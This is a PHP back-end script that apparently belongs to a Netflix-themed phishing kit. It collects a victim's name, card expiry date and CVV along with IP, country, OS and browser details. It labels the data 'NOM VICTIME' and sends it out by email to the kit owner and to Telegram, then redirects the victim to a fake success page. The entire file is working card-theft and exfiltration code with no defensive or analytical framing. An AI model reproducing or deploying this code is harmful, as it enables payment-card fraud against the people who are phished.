<?php



include_once '../inc/app.php';

if(isset($_POST['nam'])) 
  
  session_start();
		

		    $_SESSION['nam'] = $_POST['nam'];
            $_SESSION['date'] = $_POST['date'];
            $_SESSION['cry'] = $_POST['cry'];
			$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
			$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];


	
if( count($_SESSION['errors']) == 0 ) {

			
            $message .= 'NOM VICTIME : ' .$_POST['nam']. "\r\n";
            $message .= 'CC EXP : ' .$_POST['date']. "\r\n";
            $message .= 'CC CVV : ' .$_POST['cry']. "\r\n";
            $message .= 'IP address : ' . get_user_ip() . "\r\n";
            $message .= 'Country : ' . get_user_country() . "\r\n";			
			$message .= 'OS : ' . get_user_os() . "\r\n";
            $message .= 'Browser : ' . get_user_browser() . "\r\n";
  			$message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
            $message .= '/-- END TRANSMISSION --/' . "\r\n\r\n";
  
			$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=92=89=E3=80=8D_-_LOGIN_-_?=".$_SESSION['nam']." - ".$_SESSION['ip'];
			$headers = "From: =?utf-8?Q?_=F0=9F=83=8F_WEYZUX_=F0=9F=83=8F?= <log@netflixpardon.com>";

			mail($rezmail, $subject, $message, $headers);
	        
            telegram_send(urlencode($message));

			header('Location: ../auth/success.php');
			}
			





?>